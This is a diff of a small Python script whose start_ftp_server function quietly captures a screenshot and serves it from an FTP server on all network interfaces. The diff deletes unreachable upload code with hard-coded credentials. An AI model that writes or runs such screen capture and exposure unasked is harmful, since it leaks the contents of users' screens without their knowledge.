@@ -7,7 +7,6 @@ from PIL import ImageGrab
 
 
 def start_ftp_server():
-
     screenshot = ImageGrab.grab()
     screenshot.save("screenshot.png")
     screenshot.close()
@@ -29,17 +28,8 @@ def start_ftp_server():
 
     # Instantiate the FTP server with a specified address and handler
     address = ('0.0.0.0', 21)  # '0.0.0.0' means all interfaces, port 21 is default FTP port
-    print(f"")
     server = FTPServer(address, handler)
 
     # Start the server
     print("FTP server is running...")
     server.serve_forever()
-
-    # Connect to the FTP server
-    ftp = FTP(host='0.0.0.0')
-    ftp.login('user', 'password')
-
-    with open('screenshot.png', 'rb') as file:
-        # Upload the file using storbinary (suitable for binary files like PNG)
-        ftp.storbinary(f"STOR {'uploaded_image.png'}", file)
